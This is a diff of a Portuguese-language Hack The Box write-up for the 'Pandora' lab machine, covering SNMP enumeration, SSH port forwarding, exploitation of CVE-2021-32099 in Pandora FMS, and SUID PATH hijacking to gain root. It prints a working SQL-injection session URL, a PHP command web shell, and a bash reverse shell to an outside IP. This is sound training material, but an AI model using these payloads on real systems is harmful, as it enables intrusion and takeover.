@@ -184,21 +184,21 @@ curl -s -H &quot;Host: iuagveifjhbakjdsbfkjabskdfjba.panda.htb&quot; http://pand
 # Depois filtrar as resposta com esse tamanho para não aparecer uma lista enorme de falsos positivos adicionando &quot;-fs 33560&quot; ao commando para enumerar os hosts
 ffuf -c -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://panda.htb -H &quot;Host: FUZZ.panda.htb&quot; -t 200 -fs 33560
 </code></pre>
-<p>Não houve respostas nenhuma ao último comando... O site não apresenta nenhuma campo editável, nenhum parâmetro por explorar... Estamos bloqueados... O que fazer agora?</p>
+<p>Não houve respostas nenhuma ao último comando... O site não apresenta nenhum campo editável, nenhum parâmetro por explorar... Estamos bloqueados... O que fazer agora?</p>
 <p>Bem ainda não fizemos nada acerca das portas UDP! Por defeito, o nmap usa a flag -sT (TCP SCAN) mesmo não especificando manualmente a flag, mas existem mais. Para fazer um escaneamento às portas UDP, é preciso indicar-lhe a flag -sU (Necessita ser <strong>root</strong>!). Este método de Scan é extremamente lento, devido ao próprio protocolo em si.</p>
 <ul>
 <li>Em TCP, existe sempre a confirmação da resposta, em primeira instância para confirmar que o alvo está recetivo, e em segunda instância para confirmar que recebeu a mensagem</li>
 <li>Em UDP, é mais ao menos <em>Tenho isto para enviar, então envio. Só. Que se lixe se alguém recebe... Estou-me nas tintas</em>. São ditas <strong><em>ConnectionLess</em></strong></li>
 </ul>
-<p>Por isso, em UDP, o nmap não tem como saber se a conexão está a demorar porque não está aberta, ou foi bloqueada por firewall, ou se está aberto mas para um programa que não tem por função enviar uma resposta (está a receber caladinho a informação que o nmap enviou), ou seja o que for...</p>
-<p>Em suma, em UDP (e visto que estamos no CTF), podemos limitar o número de portas às top 20 portas comuns.</p>
+<p>Por isso, em UDP, o nmap não tem como saber se a conexão está a demorar porque não está aberta, ou porque foi bloqueada por firewall, ou se está aberto mas para um programa que não tem por função enviar uma resposta (está a receber caladinho a informação que o nmap enviou), ou seja o que for...</p>
+<p>Em suma, em UDP (e visto que estamos num CTF), é recomendado limitar o número de portas às top 20 portas comuns (por exemplo).</p>
 <pre><code class="language-bash">sudo nmap --top-ports 20 -sU $IP -vvv
 # ...
 # 161/udp   open          snmp         udp-response ttl 63
 # ...
 </code></pre>
-<p>Temos entre a resposta, a confirmação que uma porta está aberta! A porta UDP 161. Existem várias ferramentas para bruteforce do serviço SMNP associado. O <em>snmpwalk</em> e o <em>snmp-check</em></p>
-<p>Ambos fazem o mesmo, mas o snmpwalk apresenta o resultado em bruto! O que não é agradável à vista. Sendo assim, recomnedo mesmo o snmp-check para a enumeração do serviço SNMP</p>
+<p>Temos no meio da resposta, a confirmação que uma porta está aberta! A porta UDP 161. Existem várias ferramentas para &quot;bruteforcear&quot; do serviço SNMP associado. O <em>snmpwalk</em> e o <em>snmp-check</em></p>
+<p>Ambos fazem o mesmo, mas o snmpwalk apresenta o resultado em bruto! O que não é agradável à vista. Sendo assim, recomendo mesmo o snmp-check para a enumeração do serviço SNMP</p>
 <h2 id="snmp"><a class="header" href="#snmp">SNMP</a></h2>
 <pre><code class="language-bash">snmp-check 10.10.11.136
 # ...
@@ -222,25 +222,25 @@ ffuf -c -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-11
 <p>A porta SSH encontra-se aberta, e temos credenciais. Vamos simplesmente tentar fazer login via SSH.</p>
 <pre><code class="language-bash">sshpass -p HotelBabylon23 ssh daniel@10.10.11.136
 </code></pre>
-<p>Entramos na máquina.</p>
+<p>Estamos na máquina!</p>
 <p><img src="Assets/HTB-Linux-Easy-Pandora/foothold.png" alt="foothold" /></p>
 <h2 id="enumeração-do-sistema"><a class="header" href="#enumeração-do-sistema">Enumeração do sistema</a></h2>
 <p>Após meia dúzia de comandos pela máquina, percebi o seguinte:</p>
 <p><img src="Assets/HTB-Linux-Easy-Pandora/pandorabackup.png" alt="pandorabackup" /></p>
-<p>Existe um binário bastante suspeito! pandora_backup. É SUID. Significa que, neste caso, o usuário &quot;<em><strong>matt</strong></em>&quot; executa este ficheiro temporariamente enquanto usuário &quot;<em><strong>root</strong></em>&quot;. Logo, se conseguirmos ser &quot;<em><strong>matt</strong></em>&quot;, podemos tentar ver o que se passa com o binário, se apresenta algum tipo de vulnerabilidade.</p>
+<p>Existe um binário bastante suspeito! pandora_backup. É SUID. Significa que, neste caso, o usuário &quot;<strong><em>matt</em></strong>&quot; executa este ficheiro temporariamente enquanto usuário &quot;<strong><em>root</em></strong>&quot;. Logo, se conseguirmos ser &quot;<strong><em>matt</em></strong>&quot;, podemos tentar ver o que se passa com o binário, e se este apresenta algum tipo de vulnerabilidade.</p>
 <h2 id="virtualhost"><a class="header" href="#virtualhost">VirtualHost</a></h2>
 <p>Agora que estamos na máquina, podemos verificar se existe virtual hosting. Para isso, tenho feito da seguinte maneira:</p>
 <ul>
-<li>verificar o CMS</li>
+<li>Verificar o CMS</li>
 <li>Sabendo o CMS, pesquisar o diretório/ficheiro onde está armazenado a informação de virtual hosting.</li>
 </ul>
-<p>Para este caso, nos já sabemos o CMS que está a ser usado, pelo comando &quot;<strong><em>whatweb</em></strong>&quot; que efectuamos logo depois do nosso &quot;<strong><em>nmap</em></strong>&quot;. É um Apache 2.4.41. Normalmente, a pretendida informação encontra-se no diretório /etc/apache2/sites-available/</p>
+<p>Para este caso, nos já sabemos o CMS que está a ser usado, pelo comando &quot;<strong><em>whatweb</em></strong>&quot; que efetuamos logo no início, depois do nosso &quot;<strong><em>nmap</em></strong>&quot;. É um Apache 2.4.41. Normalmente, a pretendida informação encontra-se no diretório /etc/apache2/sites-available/</p>
 <p><img src="Assets/HTB-Linux-Easy-Pandora/virtualhost.png" alt="virtualhost" /></p>
-<p>Agora sim podemos afirmar que existe algo mais. Exite um site geral, acessível por toda a web <strong>_(&lt;VirtualHost <em>:80&gt;)</em></strong> com o seu conteúdo definido em /var/www/html, e existe outro site, acessível apenas pelo localhost <strong><em>(&lt;VirtualHost localhost:80&gt;)</em></strong> cujo diretório referente encontra-se em /var/www/pandora.</p>
+<p>Agora sim podemos afirmar que existe algo mais. Exite um site geral, acessível por toda a web <strong>(&lt;VirtualHost *:80&gt;)</strong> com o seu conteúdo definido em /var/www/html, e existe outro site, acessível apenas pelo localhost <strong>(&lt;VirtualHost localhost:80&gt;)</strong> cujo diretório referente encontra-se em /var/www/pandora.</p>
 <blockquote>
 <p>E agora? o que fazemos com esta informação?</p>
 </blockquote>
-<p>Podemos tentar ver os ficheiros todos do site, pode sempre ter informações, credenciais em texto claro... Mas primeiro, queremos simplesmente visualizar a página web. Para isso, vamos recorrer a port forwarding.</p>
+<p>Podemos tentar ver os ficheiros todos do site. Pode sempre existir informações, credenciais em texto claro... Mas primeiro, queremos simplesmente visualizar a página web. Para isso, vamos recorrer a port forwarding.</p>
 <blockquote>
 <p>Ok... Mas já estamos na máquina alvo... para que serve de &quot;sair&quot; para &quot;entrar&quot; de novo por outra via?</p>
 </blockquote>
@@ -251,50 +251,48 @@ drwxr-xr-x 14 root root 4096 Dec  7 14:32 ../
 drwxr-xr-x  3 root root 4096 Dec  7 14:32 html/
 drwxr-xr-x  3 matt matt 4096 Dec  7 14:32 pandora/
 </code></pre>
-<p>Pode servir para diversas coisas. Pode o novo site ter um serviço com credenciais de todos os usuários, pode ter acesso a uma base de dados com mais privilégios, e muitas coisas mais...
-Neste caso serve para o seguinte:</p>
+<p>Pode servir para diversas coisas. Pode o novo site ter um serviço com credenciais de todos os usuários, pode ter acesso a uma base de dados com mais privilégios, e muitas coisas mais... Neste caso, vai nos servir para o seguinte:</p>
 <ul>
 <li>O site principal, aberto ao público, não tem nada de relevante, não tem pontos de entrada.</li>
-<li>O segundo site, apenas acessível pelo localhost, tem como proprietário e &quot;<em>AssignUserID</em>&quot; o usuário &quot;<em><strong>matt</strong></em>&quot;. Significa que tudo o que for feito nesta página será executado por &quot;<em><strong>matt</strong></em>&quot;!. Se for encontrado vulnerabilidades, podemos até executar código (RCE) com o usuário &quot;<em><strong>matt</strong></em>&quot;.</li>
+<li>O segundo site, apenas acessível pelo localhost, tem como proprietário e &quot;<em>AssignUserID</em>&quot; o usuário &quot;<strong><em>matt</em></strong>&quot;. Significa que tudo o que for feito nesta página será executado por &quot;<strong><em>matt</em></strong>&quot;!. Se for encontrado vulnerabilidades, podemos até executar código (RCE) com o usuário &quot;<strong><em>matt</em></strong>&quot;.</li>
 </ul>
 <h2 id="portforwarding"><a class="header" href="#portforwarding">PortForwarding</a></h2>
-<p>Para fazer port forwarding, podemos usar uma ferramenta que nunca me falhou, é fácil de usar e é multi plataforma: O &quot;<em><strong>Chisel</strong></em>&quot;. Mas para este caso nem vai ser necessário, porque estamos na máquina via SSH, e o próprio SSH tem a opção de port forwarding. Para isso, basta terminar a conexão actual com a máquina vítima, e entrar novamente com uma flag a mais. A flag &quot;<em><strong>-L</strong></em>&quot;</p>
+<p>Para fazer port forwarding, podemos usar uma ferramenta que nunca me falhou, é fácil de usar e é multi plataforma: O &quot;<strong><em>Chisel</em></strong>&quot;. Mas para este caso nem vai ser necessário, porque estamos na máquina via SSH, e o próprio SSH tem a opção de port forwarding. Para isso, basta terminar a conexão actual com a máquina vítima, e entrar novamente com uma flag a mais. A flag &quot;<strong><em>-L</em></strong>&quot;</p>
 <pre><code class="language-bash">sshpass -p HotelBabylon23 ssh daniel@10.10.11.136 -L 80:127.0.0.1:80
 </code></pre>
 <p>A partir de agora, o nosso próprio kali-linux (ou o sistema que for) está com a porta 80 ocupada com o servidor web da máquina vítima.</p>
 <p><img src="Assets/HTB-Linux-Easy-Pandora/sitepandora.png" alt="sitepandora" /></p>
-<p>Estamos enfrentando uma página de login de um serviço chamado <strong>Pandora FMS</strong>. É basicamente um serviço de monitoramento de serviços. E por lá, podemos uploadar ficheiros sem restrições, e acessá-los também, o que significa que podemos executar código PHP de um ficheiro PHP que previamente se upload (RCE). Agora só falta entrar. Vamos ver primeiro se tem vulnerabilidades conhecidas. Precisamos para isso saber a versão do Pandora. O Pandora tem uma api, segundo a documentação, e lá, podemos ver como fazer para extrair a versão do pandora FMS</p>
+<p>Estamos enfrentando uma página de login de um serviço chamado <strong>Pandora FMS</strong>. É basicamente um serviço de monitoramento de serviços. E por lá, podemos uploadar ficheiros sem restrições, e acessá-los também, o que significa que podemos executar código PHP de um ficheiro PHP que previamente se upload com o objectivo de executar comando de sistema (RCE). Agora só falta entrar. Vamos ver primeiro se tem vulnerabilidades conhecidas. Precisamos para isso saber a versão do Pandora. O Pandora tem uma api, segundo a documentação, e lá, podemos ver como fazer para extrair a versão do pandora FMS</p>
 <blockquote>
-<p>https://pandorafms.com/manual/en/documentation/08_technical_reference/02_annex_externalapi</p>
+<p><a href="https://pandorafms.com/manual/en/documentation/08_technical_reference/02_annex_externalapi">Documentação do pandora - api</a></p>
 </blockquote>
 <pre><code class="language-bash">curl http://127.0.0.1/pandora_console/include/api.php?info=version
 # Pandora FMS v7.0NG.742_FIX_PERL2020 - PC200103 MR34
 </code></pre>
-<p>Pesquisando com a ferramenta &quot;<em><strong>searchsploit</strong></em>&quot;, não foi possível executar nenhum exploit que lá estava. Pesquisando pelo google, vi que o próprio site da Pandora FMS tem tudo sobre as suas vulnerabilidades!</p>
+<p>Pesquisando com a ferramenta &quot;<strong><em>searchsploit</em></strong>&quot;, não foi possível encontrar nenhum exploit que funcionasse. Pesquisando pelo google, vi que o próprio site da Pandora FMS tem tudo sobre as suas vulnerabilidades!</p>
 <p><img src="Assets/HTB-Linux-Easy-Pandora/pandoraexposures.png" alt="pandoraexposures" /></p>
 <h2 id="cve-2021-32099"><a class="header" href="#cve-2021-32099">CVE-2021-32099</a></h2>
-<p>Esta vulnerabilidade parece perfeita para o nosso caso. A versão é exatamente a mesma, e permite um usuário random não autenticado de simplesmente entrar.</p>
+<p>Esta vulnerabilidade parece perfeita para o nosso caso. A versão é exatamente a mesma, e permite um usuário random não autenticado entrar sem password nem nada.</p>
 <blockquote>
-<p>Existe também um exelente artigo a explicar a vulnerabilidade: <br> https://blog.sonarsource.com/pandora-fms-742-critical-code-vulnerabilities-explained</p>
+<p>Existe também um exelente artigo a explicar a vulnerabilidade: <a href="https://blog.sonarsource.com/pandora-fms-742-critical-code-vulnerabilities-explained">Artigo</a></p>
 </blockquote>
 <p>E no github, encontramos tudo e mais alguma coisa sobre todos os assuntos! Este assunto não é exceção.</p>
 <blockquote>
-<p>https://github.com/ibnuuby/CVE-2021-32099</p>
+<p><a href="https://github.com/ibnuuby/CVE-2021-32099">POC CVE-2021-32099</a></p>
 </blockquote>
 <p>Pelos vistos basta entrar na página normal de login, e adicionar à URL <strong>http://localhost/pandora_console/</strong> o seguinte: <strong>include/chart_generator.php?session_id=a%27%20UNION%20SELECT%20%27a%27,1,%27id_usuario|s:5:%22admin%22;%27%20as%20data%20FROM%20tsessions_php%20WHERE%20%271%27=%271</strong></p>
-<p>Depois voltar á página inicial de login e já está...
-<strong>http://localhost/pandora_console/</strong></p>
+<p>Depois voltar á página inicial de login e já está... <strong>http://localhost/pandora_console/</strong></p>
 <h2 id="rce-com-usuário-matt"><a class="header" href="#rce-com-usuário-matt">RCE com usuário <strong>matt</strong></a></h2>
 <p><img src="Assets/HTB-Linux-Easy-Pandora/filemanager.png" alt="filemanager" /></p>
 <p>Para executar comandos, é bastante simples. No File manager, é só fazer o upload de um ficheiro para executar comando. Eu vou logo executar o reverse shell, mas poderiamos criar outro ficheiro:</p>
-<pre><code class="language-php"># Existe mil e uma forma de executar comandos, dependendo de como está montado o serviço PHP. Para dar apenas 1 exemplo:
+<pre><code class="language-php"># Existe mil e uma forma de executar comandos, dependendo de como está montado o serviço PHP. Para dar apenas 2 exemplos:
 # Para RCE, através de um parâmetro:
 &lt;?php
-     echo &quot;\nURL Shell... url?cmd=&lt;command&gt;\n\n&quot;;
-     echo &quot;&lt;pre&gt;&quot; . shell_exec($_REQUEST['cmd']) . &quot;&lt;/pre&gt;&quot;;
+	 echo &quot;\nURL Shell... url?cmd=&lt;command&gt;\n\n&quot;;
+	 echo &quot;&lt;pre&gt;&quot; . shell_exec($_REQUEST['cmd']) . &quot;&lt;/pre&gt;&quot;;
 ?&gt;
 
-# Para directamente ter o reverse shell:
+# Para diretamente ter o reverse shell:
 &lt;?php exec(&quot;/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.14.230/443 0&gt;&amp;1'&quot;);?&gt;
 </code></pre>
 <pre><code class="language-bash"># Executar o nc em modo de escuta para receber o shell:
@@ -309,32 +307,33 @@ export TERM=xterm
 export SHELL=bash
 
 # Ctrl + Z
-stty raw -echo; fg; reset
+stty raw -echo; fg
+reset
 stty rows 40 columns 170  # Tem corresponder ao vosso ecrã (stty -a numa consola do Kali)
 </code></pre>
 <h1 id="escalada-de-privilégio"><a class="header" href="#escalada-de-privilégio">Escalada de privilégio</a></h1>
 <p>Agora que somos matt, podemos analisar o tal binário pandora_backup</p>
 <p><img src="Assets/HTB-Linux-Easy-Pandora/tar.png" alt="tar" /></p>
 <p>No meio desses caracteres todos, podemos ver um clienttar -cvf /root/...</p>
-<p>Este parece ser um unico comando &quot;<em><strong>tar</strong></em>&quot; que se colou ao &quot;client&quot; por não haver caracteres ASCII pelo meio. O que quero dizer é que, quem fez o binário, aparentemente, usou um simples comando &quot;<em><strong>tar</strong></em>&quot; para fazer o backup, mas não usou o caminho completo para chamar a ferramenta.</p>
-<p>O que isto quer dizer? </p>
+<p>Este parece ser um simples comando &quot;<strong><em>tar</em></strong>&quot; que se colou a uma palavra &quot;client&quot; por não haver caracteres ASCII pelo meio. Significa que, quem fez o binário, aparentemente, usou um simples comando &quot;<strong><em>tar</em></strong>&quot; para fazer o backup, mas não usou o caminho completo para chamar a ferramenta.</p>
+<p>O que isto quer dizer?</p>
 <h2 id="path-hijacking"><a class="header" href="#path-hijacking">Path Hijacking</a></h2>
 <p>Sabemos que o binário pandora_backup usa o tar. Onde se encontra isso?</p>
 <pre><code class="language-bash">which tar
 # /usr/bin/tar
 </code></pre>
-<p>Ok. Mas como é que o computador sabe que está ali o programa? Existe uma variável no shell que indica isso. Chama-se PATH:</p>
+<p>Ok. Mas como é que o computador sabe que está ali o programa? 
+Existe uma variável no shell que indica isso. Chama-se PATH:</p>
 <pre><code class="language-bash">echo $PATH
 # /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
 </code></pre>
-<p>É assim que o computador procura o programa, primeiro procura em &quot;<em><strong>/usr/local/sbin</strong></em>&quot;, depois em &quot;<em><strong>/usr/local/bin</strong></em>&quot;... Todas as pastas estão separadas pelos dois pontos &quot;:&quot;.
-Mas esta variável é apenas uma variável do nosso shell actual, que facilmente se altera.</p>
+<p>É assim que o computador procura o programa, primeiro procura em &quot;<strong><em>/usr/local/sbin</em></strong>&quot;, depois em &quot;<strong><em>/usr/local/bin</em></strong>&quot;, e assim sucessivamente. Todas as pastas estão separadas pelos dois pontos &quot;:&quot;. Mas esta variável é apenas uma variável que o nosso shell actual têm, que facilmente se altera.</p>
 <pre><code class="language-bash">export PATH=.:$PATH
 echo $PATH
-# .:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin 
+# .:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
 </code></pre>
 <p>Adicionamos um ponto &quot;.&quot; à primeira pasta onde o computador vai procurar pelo programa. Significa que o computador vai procurar no diretório atual, e só depois nos outros diretórios.</p>
-<p>Assim, basta criar um executável de nome &quot;<em><strong>tar</strong></em>&quot; numa pasta qualquer, e executar o binário pandora_backup a partir da mesma posição, para o linux assumir que o &quot;<em><strong>tar</strong></em>&quot; correto é o nosso próprio ficheiro &quot;<em><strong>tar</strong></em>&quot;. E, já que o binário pandora_backup é SUID, e o seu proprietário é &quot;<em><strong>root</strong></em>&quot;, significa que podemos escrever o que nos apetecer para que seja executado como &quot;<em><strong>root</strong></em>&quot;. O mais fácil é chamar um bash novo...</p>
+<p>Assim, basta criar um executável de nome &quot;<strong><em>tar</em></strong>&quot; numa pasta qualquer, e executar o binário pandora_backup a partir da mesma posição, para o linux assumir que o &quot;<strong><em>tar</em></strong>&quot; correto é o nosso próprio ficheiro &quot;<strong><em>tar</em></strong>&quot;. E, já que o binário pandora_backup é SUID, e o seu proprietário é &quot;<strong><em>root</em></strong>&quot;, significa que podemos escrever o que nos apetecer para que seja executado como &quot;<strong><em>root</em></strong>&quot;. O mais fácil é chamar um bash novo...</p>
 <p><img src="Assets/HTB-Linux-Easy-Pandora/pathhijacknotwork.png" alt="pathhijacknotwork" /></p>
 <h4 id="não-funcionou-porquê"><a class="header" href="#não-funcionou-porquê">Não funcionou! Porquê?</a></h4>
 <p>Sinceramente não sei, o que sei é que pelo ssh funcionou nesta máquina... Quando vi que não funcionou, procurei outra solução. criei uma chave id_rsa só para ter melhor conexão, conectei-me via SSH e o mesmo exploit funcionou... OK. Mistérios do Hacking!</p>
@@ -350,10 +349,9 @@ kali@kali: &gt;     ssh matt@10.10.11.136 -i id_rsa
 </code></pre>
 <p>E agora, exatamente da mesma posição, alterando primeiro a variável PATH, optemos uma shell root</p>
 <p><img src="Assets/HTB-Linux-Easy-Pandora/root.png" alt="root" /></p>
-<p>Agora só falta as flags...</p>
+<p>Agora já somos ROOT! Só falta as flags...</p>
 <blockquote>
-<p>Obrigador por lerem o writeup! Até à próxima<br>
-Criadores da máquina: TheCyberGeek e dmw0ng</p>
+<p>Obrigador por lerem o writeup! Até à próxima<br> Criadores da máquina: TheCyberGeek e dmw0ng</p>
 </blockquote>
 
                     </main>
